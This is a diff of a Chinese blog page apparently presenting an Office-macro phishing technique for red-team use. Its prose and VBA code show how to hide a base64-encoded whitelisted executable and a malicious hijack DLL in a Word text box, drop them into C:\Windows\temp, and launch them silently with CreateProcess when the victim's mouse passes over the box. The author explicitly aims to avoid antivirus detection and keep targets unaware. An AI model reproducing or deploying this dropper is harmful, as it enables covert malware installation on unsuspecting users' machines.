@@ -8,7 +8,7 @@
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="钓鱼与社工系列之office宏0x01 介绍​    根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够">
+    <meta name="description" content="钓鱼与社工系列之office宏0x01 介绍​&amp;emsp;&amp;emsp;根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于wor">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -418,13 +418,13 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="钓鱼与社工系列之office宏"><a href="#钓鱼与社工系列之office宏" class="headerlink" title="钓鱼与社工系列之office宏"></a>钓鱼与社工系列之office宏</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​    根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够的安全意识，认为word文档都是安全的。正是基于此心理状态，office宏在钓鱼中仍然占据重要成分。</p>
-<p>​    当然，现在office在国内市场中其实占据并不多，越来越多人用wps了。那么这种情况下office宏肯定是无效了，下篇文章会针对该情景分析如何钓鱼。</p>
-<h2 id="0x02-宏代码流程及免杀"><a href="#0x02-宏代码流程及免杀" class="headerlink" title="0x02 宏代码流程及免杀"></a>0x02 宏代码流程及免杀</h2><p>​    网上有很多项目及文章是如何实现宏免杀的效果，之所以要宏免杀大部分原因都是代码是实现运行宏的时候就直接远程上线到rat上。例如调用powershell或者远程下载等等代码所用到的api或者函数，都被杀软盯着。那么换个思路，我们即不调用powershell执行敏感函数，也不远程下载文件，我们所做要的是<strong>释放文件并通过dll劫持实现上线</strong>。</p>
-<p>​    释放文件其实也是个技术活，经过测试，<strong>能否释放文件成功主要看你的文件是不是静态免杀</strong>，如果文件静态免杀，那么就能够成功释放。因为这就是个正常的功能，杀软不可能拦截你释放安全的文件，不然就影响一些职业的正常办公了。而我们用的是dll劫持的方法，白名单程序肯定是安全的文件，<strong>那么就是我们的恶意dll文件如何实现静态免杀了</strong>。如何让dll文件静态免杀的方法很多，网上也有很多项目，这块内容不在该文章里，以后会详细讲解。</p>
-<p>​    上段说了释放文件，而文件也都静态免杀了。那么还有一个要注意的地方，那就是dll劫持的程序保存在word文件哪里？首先我们得将dll劫持程序已二进制形式读取出来，然后base64编码后得到了一串字符串，只要释放的时候重新base64解码并已二进制形式写入到磁盘里，这样就能够释放出dll劫持程序了。<strong>那么重点就是该base64字符串存放在哪里？千万别放在宏代码里，很容易被杀，最好的规避杀软的方法就是将base64字符串放到word正文里的文本框等控件里</strong>。然后宏代码去读取文本框里的base64字符串，再解码写入磁盘里并运行白程序实现上线。这样通过该方法就能够实现了宏免杀。</p>
-<p>​    最后一步就是如何触发宏了，千万不要使用打开word文件就触发宏的方法，很容易被杀软拦截。我常用的方法就是<strong>弄一个很大的文本框放在第一页，然后当目标的鼠标移动到文本框时就触发宏</strong>。这样的方法既能有效规避杀软，还能在目标不知情的情况下触发了宏！</p>
-<p>​    <strong>总结：寻找一个dll劫持的白程序，做一个静态免杀的dll文件，将所有文件以二进制形式读取出来并base64编码后存放到word的文本框里。宏代码功能读取文本框里的字符串并解码写入磁盘，然后运行白程序即可免杀上线！</strong></p>
+                <h1 id="钓鱼与社工系列之office宏"><a href="#钓鱼与社工系列之office宏" class="headerlink" title="钓鱼与社工系列之office宏"></a>钓鱼与社工系列之office宏</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​&emsp;&emsp;根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够的安全意识，认为word文档都是安全的。正是基于此心理状态，office宏在钓鱼中仍然占据重要成分。</p>
+<p>&emsp;&emsp;当然，现在office在国内市场中其实占据并不多，越来越多人用wps了。那么这种情况下office宏肯定是无效了，下篇文章会针对该情景分析如何钓鱼。</p>
+<h2 id="0x02-宏代码流程及免杀"><a href="#0x02-宏代码流程及免杀" class="headerlink" title="0x02 宏代码流程及免杀"></a>0x02 宏代码流程及免杀</h2><p>&emsp;&emsp;网上有很多项目及文章是如何实现宏免杀的效果，之所以要宏免杀大部分原因都是代码是实现运行宏的时候就直接远程上线到rat上。例如调用powershell或者远程下载等等代码所用到的api或者函数，都被杀软盯着。那么换个思路，我们即不调用powershell执行敏感函数，也不远程下载文件，我们所做要的是<strong>释放文件并通过dll劫持实现上线</strong>。</p>
+<p>&emsp;&emsp;释放文件其实也是个技术活，经过测试，<strong>能否释放文件成功主要看你的文件是不是静态免杀</strong>，如果文件静态免杀，那么就能够成功释放。因为这就是个正常的功能，杀软不可能拦截你释放安全的文件，不然就影响一些职业的正常办公了。而我们用的是dll劫持的方法，白名单程序肯定是安全的文件，<strong>那么就是我们的恶意dll文件如何实现静态免杀了</strong>。如何让dll文件静态免杀的方法很多，网上也有很多项目，这块内容不在该文章里，以后会详细讲解。</p>
+<p>&emsp;&emsp;上段说了释放文件，而文件也都静态免杀了。那么还有一个要注意的地方，那就是dll劫持的程序保存在word文件哪里？首先我们得将dll劫持程序已二进制形式读取出来，然后base64编码后得到了一串字符串，只要释放的时候重新base64解码并已二进制形式写入到磁盘里，这样就能够释放出dll劫持程序了。<strong>那么重点就是该base64字符串存放在哪里？千万别放在宏代码里，很容易被杀，最好的规避杀软的方法就是将base64字符串放到word正文里的文本框等控件里</strong>。然后宏代码去读取文本框里的base64字符串，再解码写入磁盘里并运行白程序实现上线。这样通过该方法就能够实现了宏免杀。</p>
+<p>&emsp;&emsp;最后一步就是如何触发宏了，千万不要使用打开word文件就触发宏的方法，很容易被杀软拦截。我常用的方法就是<strong>弄一个很大的文本框放在第一页，然后当目标的鼠标移动到文本框时就触发宏</strong>。这样的方法既能有效规避杀软，还能在目标不知情的情况下触发了宏！</p>
+<p>&emsp;&emsp;<strong>总结：寻找一个dll劫持的白程序，做一个静态免杀的dll文件，将所有文件以二进制形式读取出来并base64编码后存放到word的文本框里。宏代码功能读取文本框里的字符串并解码写入磁盘，然后运行白程序即可免杀上线！</strong></p>
 <h2 id="0x03-宏代码"><a href="#0x03-宏代码" class="headerlink" title="0x03 宏代码"></a>0x03 宏代码</h2><h3 id="0x03-1-读取文件并base64编码"><a href="#0x03-1-读取文件并base64编码" class="headerlink" title="0x03-1 读取文件并base64编码"></a>0x03-1 读取文件并base64编码</h3><p>先使用下面的代码将白程序和dll文件base64编码得到字符串</p>
 <pre><code>Sub WriteBinary(FileName, Buf)
   Dim I, aBuf, Size, bStream
@@ -443,6 +443,7 @@
   bStream.SaveToFile FileName, 2: bStream.Close
   Set bStream = Nothing
 End Sub
+
 Function Base64Encode(str() As Byte) As String                                  &#39;Base64 编码
     On Error GoTo over                                                          &#39;排错
     Dim Buf() As Byte, length As Long, mods As Long
@@ -473,6 +474,8 @@ Function Base64Encode(str() As Byte) As String                                  
     Next
 over:
 End Function
+
+
 &#39;VB Base64 解码/解密函数：
 
 Function Base64Decode(B64 As String) As Byte()                                  &#39;Base64 解码
@@ -502,6 +505,8 @@ Function Base64Decode(B64 As String) As Byte()                                  
     Base64Decode = OutStr                                                       &#39;读取解码结果
 over:
 End Function
+
+
 Sub test2()
     Dim iFN As Integer
     Dim sPath As String
@@ -514,10 +519,12 @@ Sub test2()
     outfile = &quot;c:\windows\temp\1.exe&quot;
 
     iFN = VBA.FreeFile
+
     bFileSize = VBA.FileLen(infile)
     &#39;Debug.Print bFileSize
     Open infile For Binary Access Read As iFN
     arr = InputB(bFileSize, iFN)        &#39;读取字节流
+
     infileBase = Base64Encode(arr())
 
     &#39;Debug.Print infileBase
@@ -529,6 +536,8 @@ Sub test2()
     OutPutFile.Write (infileBase)
     OutPutFile.Close
     Set FSO = Nothing
+
+
     &#39;Dim infileBaseExe As String
     &#39;infileBaseExe = Range(&quot;J22&quot;).Value
     &#39;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value
@@ -536,7 +545,11 @@ Sub test2()
     &#39;arra = Base64Decode(infileBase)
 
     &#39;WriteBinary outfile, arra
-End Sub</code></pre><h3 id="0x03-2-office宏上线代码"><a href="#0x03-2-office宏上线代码" class="headerlink" title="0x03-2 office宏上线代码"></a>0x03-2 office宏上线代码</h3><p>从文本框中读取base64内容，解码后写入到c:\windows\temp\目录下，当用户鼠标移动或点击到文本框中，触发宏执行木马</p>
+
+
+End Sub
+
+</code></pre><h3 id="0x03-2-office宏上线代码"><a href="#0x03-2-office宏上线代码" class="headerlink" title="0x03-2 office宏上线代码"></a>0x03-2 office宏上线代码</h3><p>从文本框中读取base64内容，解码后写入到c:\windows\temp\目录下，当用户鼠标移动或点击到文本框中，触发宏执行木马</p>
 <pre><code>Private Declare PtrSafe Sub Sleep Lib &quot;kernel32&quot; (ByVal Milliseconds As LongPtr)
 Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
 Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr
@@ -547,12 +560,14 @@ Private Declare PtrSafe Function CreateProcess Lib &quot;kernel32&quot; Alias &q
 Private Declare PtrSafe Function OpenProcess Lib &quot;kernel32.dll&quot; (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
 Private Declare PtrSafe Function TerminateProcess Lib &quot;kernel32&quot; (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
 Private Declare PtrSafe Function CloseHandle Lib &quot;kernel32&quot; (ByVal hObject As Long) As Long
+
 Private Type PROCESS_INFORMATION
     hProcess As Long
     hThread As Long
     dwProcessId As Long
     dwThreadId As Long
 End Type
+
 Private Type STARTUPINFO
     cb As Long
     lpReserved As String
@@ -573,8 +588,10 @@ Private Type STARTUPINFO
     hStdOutput As Long
     hStdError As Long
 End Type
+
 Const CREATE_NO_WINDOW = &amp;H8000000
 Const CREATE_NEW_CONSOLE = &amp;H10
+
 Function fileExist(filePath)
     Dim fso
     Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
@@ -585,6 +602,8 @@ Function fileExist(filePath)
     End If
     Set fso = Nothing
 End Function
+
+
 Function dddddd(B64 As String) As Byte()
     On Error GoTo over
     Dim OutStr() As Byte, i As Long, j As Long
@@ -612,17 +631,23 @@ Function dddddd(B64 As String) As Byte()
     dddddd = OutStr
 over:
 End Function
+
+
 Function runCommand(comando)
     Dim pInfo As PROCESS_INFORMATION
     Dim sInfo As STARTUPINFO
     Dim sNull As String
     Dim lSuccess As Long
     Dim lRetValue As Long
+
     lSuccess = CreateProcess(sNull, comando, ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NO_WINDOW, ByVal 0&amp;, sNull, sInfo, pInfo)
+
     lRetValue = CloseHandle(pInfo.hThread)
     lRetValue = CloseHandle(pInfo.hProcess)
 
 End Function
+
+
 Function WriteBinary(FileName, buf)
   Dim i, aBuf, Size, bStream
   Size = UBound(buf): ReDim aBuf(Size \ 2)
@@ -640,10 +665,18 @@ Function WriteBinary(FileName, buf)
   bStream.SaveToFile FileName, 2: bStream.Close
   Set bStream = Nothing
 End Function
+
+
 Function releaseFile(path As String, conte As String)
+
     hwminiArra = dddddd(conte)
     WriteBinary path, hwminiArra
+
+
+
 End Function
+
+
 Function start()
     Dim filePath As String
     filePath = &quot;C:\Windows\temp\aaaaaaa.exe&quot;
@@ -652,7 +685,12 @@ Function start()
         releaseFile &quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;, Replace(ActiveDocument.Shapes(2).TextFrame.TextRange, Chr(13), Empty)
     End If
     runCommand (filePath)
+
 End Function
+
+
+
+
 Private Sub TextBox2_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
     Static i As Integer
     i = i + 1
@@ -660,6 +698,8 @@ Private Sub TextBox2_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, 
         start
     End If
 End Sub
+
+
 Private Sub TextBox2_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
     Static i As Integer
     i = i + 1
